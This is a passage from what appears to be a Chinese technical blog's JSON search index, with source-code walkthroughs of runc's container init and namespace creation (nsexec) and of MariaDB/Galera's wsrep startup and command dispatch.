libcontainerUtils.CleanPath(m.Destination) == \"/dev\" {\n\t\t\tif m.Flags&syscall.MS_RDONLY != 0 {\n\t\t\t\tif err := remountReadonly(m.Destination); err != nil {\n\t\t\t\t\treturn newSystemErrorWithCausef(err, \"remounting %q as readonly\", m.Destination)\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak\n\t\t}\n\t}\n\t// set rootfs ( / ) as readonly\n\tif config.Readonlyfs {\n\t\tif err := setReadonly(); err != nil {\n\t\t\treturn newSystemErrorWithCause(err, \"setting rootfs as readonly\")\n\t\t}\n\t}\n\tsyscall.Umask(0022)\n\treturn nil\n}\n```\n\ninit nsenter包导入：\n\n在`runc init`命令的响应在文件 **init.go** 开头，导入 `nsenter` 包\n\n```go\n/* init.go */\nimport (\n    \"os\"\n    \"runtime\"\n\n    \"github.com/opencontainers/runc/libcontainer\"\n    _ \"github.com/opencontainers/runc/libcontainer/nsenter\"\n    \"github.com/urfave/cli\"\n)\n```\n\n而`nsenter`包中开头通过 `cgo` 嵌入了一段 C 代码, 调用 **nsexec()**\n\n```go\npackage nsenter\n/*\n/* nsenter.go */\n#cgo CFLAGS: -Wall\nextern void nsexec();\nvoid __attribute__((constructor)) init(void) {\n    nsexec();\n}\n*/\nimport \"C\"\n```\n\n接下来，轮到 **nsexec()** 完成为容器创建新的 `namespace` 的工作了, **nsexec()** 同样很长，逐段来看\n\n```go\n/* libcontainer/nsenter/nsexec.c */\nvoid nsexec(void)\n{\n    int pipenum;\n    jmp_buf env;\n    int sync_child_pipe[2], sync_grandchild_pipe[2];\n    struct nlconfig_t config = { 0 };\n\n    /*\n     * If we don't have an init pipe, just return to the go routine.\n     * We'll only get an init pipe for start or exec.\n     */\n    pipenum = initpipe();\n    if (pipenum == -1)\n        return;\n\n    /* Parse all of the netlink configuration. */\n    nl_parse(pipenum, &config);\n   \n    ......    \n```\n\n**initpipe()** 从环境中读取父进程之前设置的`pipe`(`_LIBCONTAINER_INITPIPE`记录的的文件描述符)，然后调用 **nl_parse** 从这个管道中读取配置到变量 **config** ，那么谁会往这个管道写配置呢 ? 当然就是`runc create`父进程了。父进程通过这个`pipe`，将新建容器的配置发给子进程，这个过程如下图所示:\n\n![ipc](https://segmentfault.com/img/bVblTqN?w=866&h=256)\n\n子进程就从父进程处得到了`namespace`的配置，继续往下， **nsexec()** 又创建了两个`socketpair`,从注释中了解到，这是为了和它自己的子进程和孙进程进行通信。\n\n```c\nvoid nsexec(void)\n{\n   .....\n    /* Pipe so we can tell the child when we've finished setting up. */\n    if (socketpair(AF_LOCAL, SOCK_STREAM, 0, sync_child_pipe) < 0)  //  sync_child_pipe is an out parameter\n        bail(\"failed to setup sync pipe between parent and child\");\n\n    /*\n     * We need a new socketpair to sync with grandchild so we don't have\n     * race condition with child.\n     */\n    if (socketpair(AF_LOCAL, SOCK_STREAM, 0, sync_grandchild_pipe) < 0)\n        bail(\"failed to setup sync pipe between parent and grandchild\");\n   \n}\n```\n\n**switch case** 编写的状态机,大体结构如下，当前进程通过`clone()`系统调用创建子进程，子进程又通过`clone()`系统调用创建孙进程，而实际的创建/加入`namespace`是在子进程完成的\n\n```c\nswitch (setjmp(env)) {\n  case JUMP_PARENT:{\n           .....\n           clone_parent(&env, JUMP_CHILD);\n           .....\n       }\n  case JUMP_CHILD:{\n           ......\n           if (config.namespaces)\n                join_namespaces(config.namespaces);\n           clone_parent(&env, JUMP_INIT);\n           ......\n       }\n  case JUMP_INIT:{\n       }\n```\n\n状态机流程：\n\n1. `namespaces`在`runc init 2`完成创建\n2. `runc init 1`和`runc init 2`最终都会执行`exit(0)`,但`runc init 3`不会，它会继续执行`runc init`命令的后半部分。因此最终只会剩下`runc create`进程和`runc init 3`进程\n\n![runc](https://segmentfault.com/img/bVblUmM?w=866&h=1312)\n\n回到代码中：\n\n```go\nfunc (p *initProcess) start() error {\n\n    p.cmd.Start()\n    p.process.ops = p\n    io.Copy(p.parentPipe, p.bootstrapData);\n\n    p.execSetns()\n    ......\n```\n\n再向 `runc init`发送了 **bootstrapData** 数据后，便调用 **execSetns()** 等待`runc init 1`进程终止，从管道中得到`runc init 3`的进程 **pid**,将该进程保存在 **p.process.ops**\n\n```go\n/* libcontainer/process_linux.go */\nfunc (p *initProcess) execSetns() error {\n    status, err := p.cmd.Process.Wait()\n\n    var pid *pid\n    json.NewDecoder(p.parentPipe).Decode(&pid)\n\n    process, err := os.FindProcess(pid.Pid)\n\n    p.cmd.Process = process\n    p.process.ops = p\n    return nil\n}\n```\n\n\n\n### 3. 参考资料\n\nhttps://segmentfault.com/a/1190000017576314?utm_source=tag-newest","tags":["runc"],"categories":["docker"]},{"title":"galera原理和源码学习","url":"/2020/03/27/galera原理/","content":"\n\n\n## galera原理和源码学习\n\n### 源码架构\n\n分析数据库版本： mariadb 10.1.12 + galera 25.3.14\n\n![galera-code-structure.png](/images/galera-code-structure.png)\n\n### 源码执行流程\n\n![image-20200310105545840](/images/image-20200310105545840.png)\n\n### 一致性协议\n\n说起totem协议，最简单的形象就是，他将多个节点组成一个令牌环。多个节点手拉手形成一个圈，大家依次的传递token。只有获取到token的节点才有发送消息的权利。简单有效的解决了在分布式系统中各个节点的同步问题，因为只有一个节点会在一个时刻发送消息，不会出现冲突。当然，如果有节点发生意外时，令牌环就会断掉，此时大家不能够通信，而是重新组建出一个新的令牌环。\n\n### galera代码入口\n\nwsrep是mariadb提供对外的接口，通过虚函数插件的方式加载so库动态链接库的方式来加载外部函数。mariadb可以通过galera的动态链接库来调用galera中实现的函数。galera使用的一致性协议是totem协议。这个协议强一致性，但是存在分区问题。所以galera本身遇到写入冲突的时候，会将节点排出集群之外，类似于“脑裂”的问题。galera只支持innodb数据库。\n\nwsrep入口在初始化mariadb数据库初始化的时候，\n\n```c++\nint mysqld_main(int argc, char **argv)  // 数据库入口函数\n  ...\n  /* \n   The subsequent calls may take a long time : e.g. innodb log read.\n   Thus set the long running service control manager timeout\n  */\n#if defined(_WIN32) && !defined(EMBEDDED_LIBRARY)\n  Service.SetSlowStarting(slow_start_timeout);\n#endif\n\n  if (init_server_components())   //初始化入口\n    unireg_abort(1);\n```\n\ninit_server_components函数初始化：\n\n```c++\nstatic int init_server_components()\n{\n  DBUG_ENTER(\"init_server_components\");\n  /*\n    We need to call each of these following functions to ensure that\n    all things are initialized so that unireg_abort() doesn't fail\n  */\n  mdl_init();   //初始化元数据锁\n  tdc_init();   //Initialize table definition cache.\n  if (hostname_cache_init())\n    unireg_abort(1);\n\n  query_cache_set_min_res_unit(query_cache_min_res_unit);\n  query_cache_result_size_limit(query_cache_limit);\n  /* if we set size of QC non zero in config then probably we want it ON */\n  if (query_cache_size != 0 &&\n      global_system_variables.query_cache_type == 0 &&\n      !IS_SYSVAR_AUTOSIZE(&query_cache_size))\n  {\n    global_system_variables.query_cache_type= 1;\n  }\n  query_cache_init();   // query cache init\n  query_cache_resize(query_cache_size);           //重新resize\n  my_rnd_init(&sql_rand,(ulong) server_start_time,(ulong) server_start_time/2);   //随机数初始化\n  setup_fpu();\n  init_thr_lock();\t//初始化线程锁\n\n#ifndef EMBEDDED_LIBRARY\n  if (init_thr_timer(thread_scheduler->max_threads + extra_max_connections))\n  {\n    fprintf(stderr, \"Can't initialize timers\\n\");\n    unireg_abort(1);\n  }\n#endif\n\n  my_uuid_init((ulong) (my_rnd(&sql_rand))*12345,12345);  //初始化uuid\n#ifdef HAVE_REPLICATION\n  init_slave_list();\n#endif\n  wt_init();  //初始化wt_wait_table\n\n  /* Setup logs */\n\n  /*\n    Enable old-fashioned error log, except when the user has requested\n    help information. Since the implementation of plugin server\n    variables the help output is now written much later.\n  */\n  if (opt_error_log && !opt_abort)\n  {\n    if (!log_error_file_ptr[0])\n    {\n      fn_format(log_error_file, pidfile_name, mysql_data_home, \".err\",\n                MY_REPLACE_EXT); /* replace '.<domain>' by '.err', bug#4997 */\n      SYSVAR_AUTOSIZE(log_error_file_ptr, log_error_file);\n    }\n    else\n    {\n      fn_format(log_error_file, log_error_file_ptr, mysql_data_home, \".err\",\n                MY_UNPACK_FILENAME | MY_SAFE_PATH);\n      log_error_file_ptr= log_error_file;\n    }\n    if (!log_error_file[0])\n      opt_error_log= 0;                         // Too long file name\n    else\n    {\n      my_bool res;\n#ifndef EMBEDDED_LIBRARY\n      res= reopen_fstreams(log_error_file, stdout, stderr);\n#else\n      res= reopen_fstreams(log_error_file, NULL, stderr);\n#endif\n\n      if (!res)\n        setbuf(stderr, NULL);\n\n#ifdef _WIN32\n      /* Add error log to windows crash reporting. */\n      add_file_to_crash_report(log_error_file);\n#endif\n    }\n  }\n\n  /* set up the hook before initializing plugins which may use it */\n  error_handler_hook= my_message_sql;\n  proc_info_hook= set_thd_stage_info;\n\n#ifdef WITH_PERFSCHEMA_STORAGE_ENGINE\n  /*\n    Parsing the performance schema command line option may have reported\n    warnings/information messages.\n    Now that the logger is finally available, and redirected\n    to the proper file when the --log--error option is used,\n    print the buffered messages to the log.\n  */\n  buffered_logs.print();\n  buffered_logs.cleanup();\n#endif /* WITH_PERFSCHEMA_STORAGE_ENGINE */\n\n#ifndef EMBEDDED_LIBRARY\n  /*\n    Now that the logger is available, redirect character set\n    errors directly to the logger\n    (instead of the buffered_logs used at the server startup time).\n  */\n  my_charset_error_reporter= charset_error_reporter;\n#endif\n\n  xid_cache_init(); //xid缓存初始化\n\n  /*\n    initialize delegates for extension observers, errors have already\n    been reported in the function\n  */\n  if (delegates_init())\n    unireg_abort(1);\n\n  /* need to configure logging before initializing storage engines */\n  if (!opt_bin_log_used && !WSREP_ON)\n  {\n    if (opt_log_slave_updates)\n      sql_print_warning(\"You need to use --log-bin to make \"\n                        \"--log-slave-updates work.\");\n    if (binlog_format_used)\n      sql_print_warning(\"You need to use --log-bin to make \"\n                        \"--binlog-format work.\");\n  }\n\n  /* Check that we have not let the format to unspecified at this point */\n  DBUG_ASSERT((uint)global_system_variables.binlog_format <=\n              array_elements(binlog_format_names)-1);\n\n#ifdef HAVE_REPLICATION\n  if (opt_log_slave_updates && replicate_same_server_id)\n  {\n    if (opt_bin_log)\n    {\n      sql_print_error(\"using --replicate-same-server-id in conjunction with \"\n                      \"--log-slave-updates is impossible, it would lead to \"\n                      \"infinite loops in this server.\");\n      unireg_abort(1);\n    }\n    else\n      sql_print_warning(\"using --replicate-same-server-id in conjunction with \"\n                        \"--log-slave-updates would lead to infinite loops in \"\n                        \"this server. However this will be ignored as the \"\n                        \"--log-bin option is not defined.\");\n  }\n#endif\n\n  if (opt_bin_log)  //binlog日志打开？\n  {\n    /* Reports an error and aborts, if the --log-bin's path \n       is a directory.*/\n    if (opt_bin_logname[0] && \n        opt_bin_logname[strlen(opt_bin_logname) - 1] == FN_LIBCHAR)\n    {\n      sql_print_error(\"Path '%s' is a directory name, please specify \"\n                      \"a file name for --log-bin option\", opt_bin_logname);\n      unireg_abort(1);\n    }\n\n    /* Reports an error and aborts, if the --log-bin-index's path \n       is a directory.*/\n    if (opt_binlog_index_name && \n        opt_binlog_index_name[strlen(opt_binlog_index_name) - 1] \n        == FN_LIBCHAR)\n    {\n      sql_print_error(\"Path '%s' is a directory name, please specify \"\n                      \"a file name for --log-bin-index option\",\n                      opt_binlog_index_name);\n      unireg_abort(1);\n    }\n\n    char buf[FN_REFLEN];\n    const char *ln;\n    ln= mysql_bin_log.generate_name(opt_bin_logname, \"-bin\", 1, buf);\n    if (!opt_bin_logname[0] && !opt_binlog_index_name)\n    {\n      /*\n        User didn't give us info to name the binlog index file.\n        Picking `hostname`-bin.index like did in 4.x, causes replication to\n        fail if the hostname is changed later. So, we would like to instead\n        require a name. But as we don't want to break many existing setups, we\n        only give warning, not error.\n      */\n      sql_print_warning(\"No argument was provided to --log-bin and \"\n                        \"neither --log-basename or --log-bin-index where \"\n                        \"used;  This may cause repliction to break when this \"\n                        \"server acts as a master and has its hostname \"\n                        \"changed! Please use '--log-basename=%s' or \"\n                        \"'--log-bin=%s' to avoid this problem.\",\n                        opt_log_basename, ln);\n    }\n    if (ln == buf)\n      opt_bin_logname= my_once_strdup(buf, MYF(MY_WME));\n  }\n\n  /*\n    Wsrep initialization must happen at this point, because:\n    - opt_bin_logname must be known when starting replication\n      since SST may need it\n    - SST may modify binlog index file, so it must be opened\n      after SST has happened\n\n    We also (unconditionally) initialize wsrep LOCKs and CONDs.\n    It is because they are used while accessing wsrep system\n    variables even when a wsrep provider is not loaded.\n  */\n\n  wsrep_thr_init();\n\n  if (WSREP_ON && !wsrep_recovery && !opt_abort) /* WSREP BEFORE SE */\n  {\n    if (opt_bootstrap) // bootsrap option given - disable wsrep functionality\n    {\n      wsrep_provider_init(WSREP_NONE);   //节点初始化\n      if (wsrep_init())  //初始化数据结构和回调函数\n        unireg_abort(1);\n    }\n    else // full wsrep initialization\n    {\n      // add basedir/bin to PATH to resolve wsrep script names\n      char* const tmp_path= (char*)my_alloca(strlen(mysql_home) +\n                                             strlen(\"/bin\") + 1);\n      if (tmp_path)\n      {\n        strcpy(tmp_path, mysql_home);\n        strcat(tmp_path, \"/bin\");\n        wsrep_prepend_PATH(tmp_path);\n      }\n      else\n      {\n        WSREP_ERROR(\"Could not append %s/bin to PATH\", mysql_home);\n      }\n      my_afree(tmp_path);\n\n      if (wsrep_before_SE())\n      {\n        set_ports(); // this is also called in network_init() later but we need\n                     // to know mysqld_port now - lp:1071882\n        wsrep_init_startup(true);\n      }\n    }\n  }\n\n  if (opt_bin_log) //如果binlog打开，打开索引文件\n  {\n    if (mysql_bin_log.open_index_file(opt_binlog_index_name, opt_bin_logname,\n                                      TRUE))\n    {\n      unireg_abort(1);\n    }\n  }\n\n  if (opt_bin_log)\n  {\n    log_bin_basename=\n      rpl_make_log_name(opt_bin_logname, pidfile_name,\n                        opt_bin_logname ? \"\" : \"-bin\");\n    log_bin_index=\n      rpl_make_log_name(opt_binlog_index_name, log_bin_basename, \".index\");\n    if (log_bin_basename == NULL || log_bin_index == NULL)\n    {\n      sql_print_error(\"Unable to create replication path names:\"\n                      \" out of memory or path names too long\"\n                      \" (path name exceeds \" STRINGIFY_ARG(FN_REFLEN)\n                      \" or file name exceeds \" STRINGIFY_ARG(FN_LEN) \").\");\n      unireg_abort(1);\n    }\n  }\n\n#ifndef EMBEDDED_LIBRARY\n  DBUG_PRINT(\"debug\",\n             (\"opt_bin_logname: %s, opt_relay_logname: %s, pidfile_name: %s\",\n              opt_bin_logname, opt_relay_logname, pidfile_name));\n  if (opt_relay_logname)\n  {\n    relay_log_basename=\n      rpl_make_log_name(opt_relay_logname, pidfile_name,\n                        opt_relay_logname ? \"\" : \"-relay-bin\");\n    relay_log_index=\n      rpl_make_log_name(opt_relaylog_index_name, relay_log_basename, \".index\");\n    if (relay_log_basename == NULL || relay_log_index == NULL)\n    {\n      sql_print_error(\"Unable to create replication path names:\"\n                      \" out of memory or path names too long\"\n                      \" (path name exceeds \" STRINGIFY_ARG(FN_REFLEN)\n                      \" or file name exceeds \" STRINGIFY_ARG(FN_LEN) \").\");\n      unireg_abort(1);\n    }\n  }\n#endif /* !EMBEDDED_LIBRARY */\n\n  /* call ha_init_key_cache() on all key caches to init them */\n  process_key_caches(&ha_init_key_cache, 0);\n\n  init_global_table_stats(); //初始化全局表统计\n  init_global_index_stats();\n\n  /* Allow storage engine to give real error messages */\n  if (ha_init_errors())\n    DBUG_RETURN(1);\n\n  tc_log= 0; // ha_initialize_handlerton() needs that\n\n  if (plugin_init(&remaining_argc, remaining_argv,\n                  (opt_noacl ? PLUGIN_INIT_SKIP_PLUGIN_TABLE : 0) |\n                  (opt_abort ? PLUGIN_INIT_SKIP_INITIALIZATION : 0)))\n  {\n    sql_print_error(\"Failed to initialize plugins.\");\n    unireg_abort(1);\n  }\n  plugins_are_initialized= TRUE;  /* Don't separate from init function */\n\n  /* we do want to exit if there are any other unknown options */\n  if (remaining_argc > 1)\n  {\n    int ho_error;\n    struct my_option no_opts[]=\n    {\n      {0, 0, 0, 0, 0, 0, GET_NO_ARG, NO_ARG, 0, 0, 0, 0, 0, 0}\n    };\n    /*\n      We need to eat any 'loose' arguments first before we conclude\n      that there are unprocessed options.\n    */\n    my_getopt_skip_unknown= 0;\n\n    if ((ho_error= handle_options(&remaining_argc, &remaining_argv, no_opts,\n                                  mysqld_get_one_option)))\n      unireg_abort(ho_error);\n    /* Add back the program name handle_options removes */\n    remaining_argc++;\n    remaining_argv--;\n    my_getopt_skip_unknown= TRUE;\n\n    if (remaining_argc > 1)\n    {\n      fprintf(stderr, \"%s: Too many arguments (first extra is '%s').\\n\",\n              my_progname, remaining_argv[1]);\n      unireg_abort(1);\n    }\n  }\n\n  if (init_io_cache_encryption())\n    unireg_abort(1);\n\n  if (opt_abort)\n    unireg_abort(0);\n\n  /* if the errmsg.sys is not loaded, terminate to maintain behaviour */\n  if (!DEFAULT_ERRMSGS[0][0])\n    unireg_abort(1);  \n\n  /* We have to initialize the storage engines before CSV logging */\n  if (ha_init())\n  {\n    sql_print_error(\"Can't init databases\");\n    unireg_abort(1);\n  }\n\n  if (opt_bootstrap)\n    log_output_options= LOG_FILE;\n  else\n    logger.init_log_tables();\n\n  if (log_output_options & LOG_NONE)\n  {\n    /*\n      Issue a warining if there were specified additional options to the\n      log-output along with NONE. Probably this wasn't what user wanted.\n    */\n    if ((log_output_options & LOG_NONE) && (log_output_options & ~LOG_NONE))\n      sql_print_warning(\"There were other values specified to \"\n                        \"log-output besides NONE. Disabling slow \"\n                        \"and general logs anyway.\");\n    logger.set_handlers(LOG_FILE, LOG_NONE, LOG_NONE);\n  }\n  else\n  {\n    /* fall back to the log files if tables are not present */\n    LEX_STRING csv_name={C_STRING_WITH_LEN(\"csv\")};\n    if (!plugin_is_ready(&csv_name, MYSQL_STORAGE_ENGINE_PLUGIN))\n    {\n      /* purecov: begin inspected */\n      sql_print_error(\"CSV engine is not present, falling back to the \"\n                      \"log files\");\n      SYSVAR_AUTOSIZE(log_output_options, \n                      (log_output_options & ~LOG_TABLE) | LOG_FILE);\n      /* purecov: end */\n    }\n\n    logger.set_handlers(LOG_FILE,\n                        global_system_variables.sql_log_slow ?\n                        log_output_options:LOG_NONE,\n                        opt_log ? log_output_options:LOG_NONE);\n  }\n\n  if (init_default_storage_engine(default_storage_engine, table_plugin))\n    unireg_abort(1);\n\n  if (default_tmp_storage_engine && !*default_tmp_storage_engine)\n    default_tmp_storage_engine= NULL;\n\n  if (enforced_storage_engine && !*enforced_storage_engine)\n    enforced_storage_engine= NULL;\n\n  if (init_default_storage_engine(default_tmp_storage_engine, tmp_table_plugin))\n    unireg_abort(1);\n\n  if (init_default_storage_engine(enforced_storage_engine, enforced_table_plugin))\n    unireg_abort(1);\n\n#ifdef USE_ARIA_FOR_TMP_TABLES\n  if (!ha_storage_engine_is_enabled(maria_hton) && !opt_bootstrap)\n  {\n    sql_print_error(\"Aria engine is not enabled or did not start. The Aria engine must be enabled to continue as mysqld was configured with --with-aria-tmp-tables\");\n    unireg_abort(1);\n  }\n#endif\n\n#ifdef WITH_WSREP\n  if (WSREP_ON && !opt_bin_log)\n  {\n    wsrep_emulate_bin_log= 1;\n  }\n#endif\n\n  tc_log= get_tc_log_implementation();\n\n  if (tc_log->open(opt_bin_log ? opt_bin_logname : opt_tc_log_file))\n  {\n    sql_print_error(\"Can't init tc log\");\n    unireg_abort(1);\n  }\n\n  if (ha_recover(0))\n  {\n    unireg_abort(1);\n  }\n\n  if (opt_bin_log)\n  {\n    /**\n     * mutex lock is not needed here.\n     * but to be able to have mysql_mutex_assert_owner() in code,\n     * we do it anyway */\n    mysql_mutex_lock(mysql_bin_log.get_log_lock());\n    int r= mysql_bin_log.open(opt_bin_logname, LOG_BIN, 0, 0,\n                              WRITE_CACHE, max_binlog_size, 0, TRUE);\n    mysql_mutex_unlock(mysql_bin_log.get_log_lock());\n    if (r)\n      unireg_abort(1);\n  }\n\n#ifdef HAVE_REPLICATION\n  if (opt_bin_log && expire_logs_days)\n  {\n    time_t purge_time= server_start_time - expire_logs_days*24*60*60;\n    if (purge_time >= 0)\n      mysql_bin_log.purge_logs_before_date(purge_time);\n  }\n#endif\n\n  if (opt_myisam_log)\n    (void) mi_log(1);\n\n#if defined(HAVE_MLOCKALL) && defined(MCL_CURRENT) && !defined(EMBEDDED_LIBRARY)\n  if (locked_in_memory)\n  {\n    int error;\n    if (user_info)\n    {\n      DBUG_ASSERT(!getuid());\n      if (setreuid((uid_t) -1, 0) == -1)\n      {\n        sql_perror(\"setreuid\");\n        unireg_abort(1);\n      }\n      error= mlockall(MCL_CURRENT);\n      set_user(mysqld_user, user_info);\n    }\n    else\n      error= mlockall(MCL_CURRENT);\n\n    if (error)\n    {\n      if (global_system_variables.log_warnings)\n\tsql_print_warning(\"Failed to lock memory. Errno: %d\\n\",errno);\n      locked_in_memory= 0;\n    }\n  }\n#else\n  locked_in_memory= 0;\n#endif\n\n  ft_init_stopwords();\n\n  init_max_user_conn();  //初始化最大用户链接数目\n  init_update_queries(); // 初始化update queries\n  init_global_user_stats();\n  init_global_client_stats();\n  if (!opt_bootstrap)\n    servers_init(0);\n  init_status_vars();\n  DBUG_RETURN(0);\n}\n```\n\nwsrep_init初始化：\n\n```C++\nint wsrep_init()\n{\n  int rcode= -1;\n  DBUG_ASSERT(wsrep_inited == 0);\n\n  if (strcmp(wsrep_start_position, WSREP_START_POSITION_ZERO))\n    wsrep_start_position_init(wsrep_start_position);  //初始化启动位置，扫描uuid和seqno\n\n  wsrep_sst_auth_init(wsrep_sst_auth);  // 同步数据认证\n\n  wsrep_causal_reads_update(&global_system_variables); // wsrep_sync_wait状态更新\n\n  wsrep_ready_set(FALSE);\n  assert(wsrep_provider);\n\n  wsrep_init_position();  //根据获取到的uuid和seqno启动位置\n\n  if ((rcode= wsrep_load(wsrep_provider, &wsrep, wsrep_log_cb)) != WSREP_OK)  //wsrep_provider加载\n  {\n    if (strcasecmp(wsrep_provider, WSREP_NONE))\n    {\n      WSREP_ERROR(\"wsrep_load(%s) failed: %s (%d). Reverting to no provider.\",\n                  wsrep_provider, strerror(rcode), rcode);\n      strcpy((char*)wsrep_provider, WSREP_NONE); // damn it's a dirty hack\n      (void) wsrep_init();\n      return rcode;\n    }\n    else /* this is for recursive call above */\n    {\n      WSREP_ERROR(\"Could not revert to no provider: %s (%d). Need to abort.\",\n                  strerror(rcode), rcode);\n      unireg_abort(1);\n    }\n  }\n\n  if (!WSREP_PROVIDER_EXISTS) //如果不存在初始化\n  {\n    // enable normal operation in case no provider is specified\n    wsrep_ready_set(TRUE);\n    wsrep_inited= 1;\n    global_system_variables.wsrep_on = 0;\n    wsrep_init_args args;\n    args.logger_cb = wsrep_log_cb;\n    args.options = (wsrep_provider_options) ?\n            wsrep_provider_options : \"\";\n    rcode = wsrep->init(wsrep, &args);\n    if (rcode)\n    {\n      DBUG_PRINT(\"wsrep\",(\"wsrep::init() failed: %d\", rcode));\n      WSREP_ERROR(\"wsrep::init() failed: %d, must shutdown\", rcode);\n      wsrep->free(wsrep);\n      free(wsrep);\n      wsrep = NULL;\n    }\n    return rcode;\n  }\n  else\n  {\n    global_system_variables.wsrep_on = 1;\n    strncpy(provider_name,\n            wsrep->provider_name,    sizeof(provider_name) - 1);\n    strncpy(provider_version,\n            wsrep->provider_version, sizeof(provider_version) - 1);\n    strncpy(provider_vendor,\n            wsrep->provider_vendor,  sizeof(provider_vendor) - 1);\n  }\n\n  /* Initialize node address */\n  char node_addr[512]= { 0, };\n  size_t const node_addr_max= sizeof(node_addr) - 1;\n  if (!wsrep_node_address || !strcmp(wsrep_node_address, \"\"))\n  {\n    size_t const ret= wsrep_guess_ip(node_addr, node_addr_max);\n    if (!(ret > 0 && ret < node_addr_max))\n    {\n      WSREP_WARN(\"Failed to guess base node address. Set it explicitly via \"\n                 \"wsrep_node_address.\");\n      node_addr[0]= '\\0';\n    }\n  }\n  else\n  {\n    strncpy(node_addr, wsrep_node_address, node_addr_max);\n  }\n\n  /* Initialize node's incoming address */\n  char inc_addr[512]= { 0, };\n  size_t const inc_addr_max= sizeof (inc_addr);\n\n  /*\n    In case wsrep_node_incoming_address is either not set or set to AUTO,\n    we need to use mysqld's my_bind_addr_str:mysqld_port, lastly fallback\n    to wsrep_node_address' value if mysqld's bind-address is not set either.\n  */\n  if ((!wsrep_node_incoming_address ||\n       !strcmp (wsrep_node_incoming_address, WSREP_NODE_INCOMING_AUTO)))\n  {\n    bool is_ipv6= false;\n    unsigned int my_bind_ip= INADDR_ANY; // default if not set\n\n    if (my_bind_addr_str && strlen(my_bind_addr_str))\n    {\n      my_bind_ip= wsrep_check_ip(my_bind_addr_str, &is_ipv6);\n    }\n\n    if (INADDR_ANY != my_bind_ip)\n    {\n      /*\n        If its a not a valid address, leave inc_addr as empty string. mysqld\n        is not listening for client connections on network interfaces.\n      */\n      if (INADDR_NONE != my_bind_ip && INADDR_LOOPBACK != my_bind_ip)\n      {\n        const char *fmt= (is_ipv6) ? \"[%s]:%u\" : \"%s:%u\";\n        snprintf(inc_addr, inc_addr_max, fmt, my_bind_addr_str, mysqld_port);\n      }\n    }\n    else /* mysqld binds to 0.0.0.0, try taking IP from wsrep_node_address. */\n    {\n      size_t const node_addr_len= strlen(node_addr);\n      if (node_addr_len > 0)\n      {\n        wsp::Address addr(node_addr);\n\n        if (!addr.is_valid())\n        {\n          WSREP_DEBUG(\"Could not parse node address : %s\", node_addr);\n          WSREP_WARN(\"Guessing address for incoming client connections failed. \"\n                     \"Try setting wsrep_node_incoming_address explicitly.\");\n          goto done;\n        }\n\n        const char *fmt= (addr.is_ipv6()) ? \"[%s]:%u\" : \"%s:%u\";\n        snprintf(inc_addr, inc_addr_max, fmt, addr.get_address(),\n                 (int) mysqld_port);\n      }\n    }\n  }\n  else\n  {\n    wsp::Address addr(wsrep_node_incoming_address);\n\n    if (!addr.is_valid())\n    {\n      WSREP_WARN(\"Could not parse wsrep_node_incoming_address : %s\",\n                 wsrep_node_incoming_address);\n      goto done;\n    }\n\n    /*\n      In case port is not specified in wsrep_node_incoming_address, we use\n      mysqld_port.\n    */\n    int port= (addr.get_port() > 0) ? addr.get_port() : (int) mysqld_port;\n    const char *fmt= (addr.is_ipv6()) ? \"[%s]:%u\" : \"%s:%u\";\n\n    snprintf(inc_addr, inc_addr_max, fmt, addr.get_address(), port);\n  }\n\ndone:\n  struct wsrep_init_args wsrep_args; //初始化启动参数数据结构\n\n  struct wsrep_gtid const state_id = { local_uuid, local_seqno };\n\n  wsrep_args.data_dir        = wsrep_data_home_dir;\n  wsrep_args.node_name       = (wsrep_node_name) ? wsrep_node_name : \"\";\n  wsrep_args.node_address    = node_addr;\n  wsrep_args.node_incoming   = inc_addr;\n  wsrep_args.options         = (wsrep_provider_options) ?\n                                wsrep_provider_options : \"\";\n  wsrep_args.proto_ver       = wsrep_max_protocol_version;\n\n  wsrep_args.state_id        = &state_id;\n\n  wsrep_args.logger_cb       = wsrep_log_cb;\n  wsrep_args.view_handler_cb = wsrep_view_handler_cb;\n  wsrep_args.apply_cb        = wsrep_apply_cb;\n  wsrep_args.commit_cb       = wsrep_commit_cb;\n  wsrep_args.unordered_cb    = wsrep_unordered_cb;\n  wsrep_args.sst_donate_cb   = wsrep_sst_donate_cb;\n  wsrep_args.synced_cb       = wsrep_synced_cb;\n\n  rcode = wsrep->init(wsrep, &wsrep_args);  //调用接口告诉galera这些信息\n\n  if (rcode)\n  {\n    DBUG_PRINT(\"wsrep\",(\"wsrep::init() failed: %d\", rcode));\n    WSREP_ERROR(\"wsrep::init() failed: %d, must shutdown\", rcode);\n    wsrep->free(wsrep);\n    free(wsrep);\n    wsrep = NULL;\n  } else {\n    wsrep_inited= 1;\n  }\n\n  return rcode;\n}\n```\n\n初始化的过程基本结束，主要初始化的过程在这个地方实现。\n\n数据库执行语句的时候，在函数dispatcher_command函数中执行。\n\n```c++\nbool dispatch_command(enum enum_server_command command, THD *thd,\n\t\t      char* packet, uint packet_length)\n{\n  NET *net= &thd->net;\n  bool error= 0;\n  bool do_end_of_statement= true;\n  DBUG_ENTER(\"dispatch_command\");\n  DBUG_PRINT(\"info\", (\"command: %d\", command));\n\n  inc_thread_running();\n\n#ifdef WITH_WSREP    // 开启了wsrep的话继续走\n  if (WSREP(thd))\n  {\n    if (!thd->in_multi_stmt_transaction_mode())\n    {\n      thd->wsrep_PA_safe= true;\n    }\n\n    mysql_mutex_lock(&thd->LOCK_wsrep_thd);\n    thd->wsrep_query_state= QUERY_EXEC;\n    if (thd->wsrep_conflict_state== RETRY_AUTOCOMMIT)\n    {\n      thd->wsrep_conflict_state= NO_CONFLICT;\n    }\n    if (thd->wsrep_conflict_state== MUST_ABORT)\n    {\n      wsrep_client_rollback(thd);\n    }\n    if (thd->wsrep_conflict_state== ABORTED)\n    {\n      my_error(ER_LOCK_DEADLOCK, MYF(0), \"wsrep aborted transaction\");\n      WSREP_DEBUG(\"Deadlock error for: %s\", thd->query());\n      mysql_mutex_unlock(&thd->LOCK_wsrep_thd);\n      thd->killed               = NOT_KILLED;\n      thd->mysys_var->abort     = 0;\n      thd->wsrep_conflict_state = NO_CONFLICT;\n      thd->wsrep_retry_counter  = 0;\n      goto dispatch_end;\n    }\n    mysql_mutex_unlock(&thd->LOCK_wsrep_thd);\n  }\n#endif /* WITH_WSREP */   //wsrep结束\n#if defined(ENABLED_PROFILING)\n  thd->profiling.start_new_query();\n#endif\n  MYSQL_COMMAND_START(thd->thread_id, command,\n                      &thd->security_ctx->priv_user[0],\n                      (char *) thd->security_ctx->host_or_ip);\n  \n  DBUG_EXECUTE_IF(\"crash_dispatch_command_before\",\n                  { DBUG_PRINT(\"crash_dispatch_command_before\", (\"now\"));\n                    DBUG_ABORT(); });\n\n  